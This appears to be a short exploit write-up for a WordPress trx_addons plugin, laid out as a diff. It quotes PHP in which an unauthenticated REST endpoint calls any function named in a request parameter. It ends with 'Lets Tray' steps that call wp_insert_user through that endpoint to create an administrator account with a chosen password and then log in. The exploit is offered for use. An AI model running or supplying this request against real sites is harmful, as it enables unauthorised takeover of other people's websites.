@@ -1,0 +1,38 @@
+Point One
+// Register endpoints
+if ( !function_exists( 'trx_addons_rest_register_endpoints' ) ) {
+   add_action( 'rest_api_init', 'trx_addons_rest_register_endpoints');
+   function trx_addons_rest_register_endpoints() {
+      // Return layouts for the Gutenberg blocks
+      register_rest_route( 'trx_addons/v2', '/get/sc_layout', array(
+         'methods' => 'GET,POST',
+         'callback' => 'trx_addons_rest_get_sc_layout',
+         ));
+      }
+}
+ 
+// Return layout
+if ( !function_exists( 'trx_addons_rest_get_sc_layout' ) && class_exists( 'WP_REST_Request' ) ) {
+   function trx_addons_rest_get_sc_layout(WP_REST_Request $request) {
+
+Point Two
+       // Get params from widget
+      $params = $request->get_params();
+      if (!empty($params['sc'])) {
+         $sc = str_replace('trx_sc_', 'trx_addons_sc_', $params['sc']);
+         if (function_exists($sc)) {
+            $response['data'] = $sc($params);
+         } else {
+            $response['data'] = '<div class="sc_error">' . esc_html(sprintf(__("Unknown block %s", 'trx_addons'), $params['sc'])) . '</div>';
+         }
+      }
+    
+      return new WP_REST_Response($response);
+   }
+}
+
+Lets Tray
+1. wp-json/trx_addons/v2/get/sc_layout?sc=print_r
+2. wp_insert_user&role=administrator&user_login=user&user_pass=Pass
+3. Try Login With Your Payload
+4. Gotcha
